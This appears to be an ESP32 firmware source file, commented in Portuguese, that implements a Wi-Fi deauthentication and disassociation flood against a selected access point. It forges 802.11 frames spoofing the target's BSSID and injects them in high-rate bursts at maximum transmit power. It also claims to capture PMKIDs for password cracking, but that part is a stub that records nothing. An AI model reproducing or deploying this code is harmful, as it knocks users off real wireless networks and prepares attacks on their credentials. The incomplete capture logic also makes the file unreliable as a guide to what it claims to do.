#include "wifi_deauth_pmkid.h"
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <driver/gpio.h>
#include <esp_system.h>
#include <esp_timer.h>
#include <globals.h>

// Configurações otimizadas para deauth DMA
#define WIFI_DEAUTH_INTERVAL_US 500  // ~2000pps (500us entre pacotes)
#define WIFI_DEAUTH_BURST_SIZE 50    // Burst agressivo de 50 pacotes
#define WIFI_DEAUTH_MAX_TX_POWER 84  // Potência máxima (20dBm)

// Buffer DMA otimizado para deauth frames
static uint8_t deauth_frame_buffer[26] __attribute__((aligned(4))) = {
    0xC0, 0x00,                         // Frame Control (deauth)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest MAC (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
    0x00, 0x00,                         // Sequence
    0x07, 0x00                          // Reason code (7 = class 3 frame received from nonassociated STA)
};

// Buffer para disassociate frame (alternativo)
static uint8_t disassoc_frame_buffer[26] __attribute__((aligned(4))) = {
    0xA0, 0x00,                         // Frame Control (disassoc)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence
    0x01, 0x00                          // Reason code
};

// Task e controle
static TaskHandle_t wifi_deauth_task = NULL;
static volatile bool wifi_deauth_active = false;
static volatile uint32_t deauth_packets_sent = 0;
static volatile uint32_t pmkid_captures = 0;

// Target atual
static wifi_ap_record_t current_target_ap;

// Mutex para thread safety
static SemaphoreHandle_t wifi_mutex = NULL;

// PMKID capture buffer (armazenado em PSRAM)
static uint8_t* pmkid_buffer = NULL;
static uint32_t pmkid_buffer_size = 0;
#define PMKID_BUFFER_MAX_SIZE (64 * 1024)  // 64KB para PMKID

// Timer para controle de intervalo preciso
static esp_timer_handle_t deauth_timer = NULL;

// Função callback do timer para deauth burst
static void deauth_timer_callback(void* arg) {
    static uint8_t burst_count = 0;

    if (!wifi_deauth_active) return;

    // Envia burst de deauth frames
    for (int i = 0; i < WIFI_DEAUTH_BURST_SIZE; i++) {
        // Alterna entre deauth e disassociate
        uint8_t* frame = (i % 2 == 0) ? deauth_frame_buffer : disassoc_frame_buffer;

        // Injeta via DMA
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(deauth_frame_buffer), false);
        if (err == ESP_OK) {
            deauth_packets_sent++;
        }
    }

    burst_count++;
}

// Função worker para deauth + PMKID
static void wifi_deauth_worker(void* pvParameters) {
    // Configura timer de alta precisão
    esp_timer_create_args_t timer_args = {
        .callback = deauth_timer_callback,
        .arg = NULL,
        .dispatch_method = ESP_TIMER_TASK,
        .name = "deauth_timer"
    };

    if (esp_timer_create(&timer_args, &deauth_timer) != ESP_OK) {
        log_e("[WIFI] Failed to create deauth timer");
        vTaskDelete(NULL);
        return;
    }

    // Inicializa WiFi em modo station para injeção
    wifi_config_t wifi_config = {};
    strcpy((char*)wifi_config.sta.ssid, "deauth_injector");
    wifi_config.sta.threshold.authmode = WIFI_AUTH_OPEN;

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    // Configura canal do target
    ESP_ERROR_CHECK(esp_wifi_set_channel(current_target_ap.primary, WIFI_SECOND_CHAN_NONE));

    // Configura potência máxima
    ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(WIFI_DEAUTH_MAX_TX_POWER));

    // Prepara frames com MAC do AP
    memcpy(&deauth_frame_buffer[10], current_target_ap.bssid, 6);  // Source
    memcpy(&deauth_frame_buffer[16], current_target_ap.bssid, 6);  // BSSID

    memcpy(&disassoc_frame_buffer[10], current_target_ap.bssid, 6);
    memcpy(&disassoc_frame_buffer[16], current_target_ap.bssid, 6);

    log_i("[WIFI] Starting deauth flood on %02X:%02X:%02X:%02X:%02X:%02X",
          current_target_ap.bssid[0], current_target_ap.bssid[1], current_target_ap.bssid[2],
          current_target_ap.bssid[3], current_target_ap.bssid[4], current_target_ap.bssid[5]);

    // Inicia timer para bursts regulares
    if (esp_timer_start_periodic(deauth_timer, WIFI_DEAUTH_INTERVAL_US) != ESP_OK) {
        log_e("[WIFI] Failed to start deauth timer");
        esp_timer_delete(deauth_timer);
        vTaskDelete(NULL);
        return;
    }

    // Loop principal mantendo PMKID capture ativo
    while (wifi_deauth_active) {
        // Monitora por PMKID handshakes
        wifi_promiscuous_pkt_t* pkt = NULL;

        // Small delay para não sobrecarregar CPU
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    // Cleanup
    esp_timer_stop(deauth_timer);
    esp_timer_delete(deauth_timer);
    esp_wifi_stop();
    vTaskDelete(NULL);
}

// Função para configurar target AP
bool set_deauth_target(const wifi_ap_record_t* ap_record) {
    if (ap_record == NULL) return false;

    if (xSemaphoreTake(wifi_mutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
        memcpy(&current_target_ap, ap_record, sizeof(wifi_ap_record_t));
        xSemaphoreGive(wifi_mutex);
        return true;
    }

    return false;
}

// Função para iniciar deauth flood
bool start_wifi_deauth_pmkid() {
    if (wifi_deauth_active) return false;

    // Inicializa mutex
    if (wifi_mutex == NULL) {
        wifi_mutex = xSemaphoreCreateMutex();
        if (wifi_mutex == NULL) return false;
    }

    // Inicializa PMKID buffer se necessário
    if (pmkid_buffer == NULL) {
        pmkid_buffer = (uint8_t*)ps_malloc(PMKID_BUFFER_MAX_SIZE);
        if (pmkid_buffer == NULL) {
            log_e("[WIFI] Failed to allocate PMKID buffer");
            return false;
        }
        pmkid_buffer_size = 0;
    }

    wifi_deauth_active = true;
    deauth_packets_sent = 0;
    pmkid_captures = 0;

    // Cria task de alta prioridade
    BaseType_t result = xTaskCreatePinnedToCore(
        wifi_deauth_worker,
        "WIFI_DEAUTH_PMKID",
        8192,  // Stack maior para WiFi ops
        NULL,
        6,     // Prioridade máxima
        &wifi_deauth_task,
        0      // Core 0 para WiFi
    );

    return (result == pdPASS);
}

// Função para parar deauth
void stop_wifi_deauth_pmkid() {
    if (!wifi_deauth_active) return;

    wifi_deauth_active = false;

    if (wifi_deauth_task != NULL) {
        vTaskDelete(wifi_deauth_task);
        wifi_deauth_task = NULL;
    }

    if (deauth_timer != NULL) {
        esp_timer_stop(deauth_timer);
        esp_timer_delete(deauth_timer);
        deauth_timer = NULL;
    }

    esp_wifi_stop();

    log_i("[WIFI] Deauth stopped. Sent: %lu packets, PMKID: %lu captures",
          deauth_packets_sent, pmkid_captures);
}

// Funções de estatísticas
uint32_t get_deauth_packets_sent() {
    return deauth_packets_sent;
}

uint32_t get_pmkid_captures() {
    return pmkid_captures;
}

bool is_wifi_deauth_active() {
    return wifi_deauth_active;
}

// Função para salvar PMKID para SD
bool save_pmkid_to_sd() {
    if (pmkid_buffer == NULL || pmkid_buffer_size == 0) return false;

    // Implementar salvamento em SD
    // Por enquanto, apenas log
    log_i("[WIFI] PMKID buffer size: %lu bytes", pmkid_buffer_size);
    return true;
}
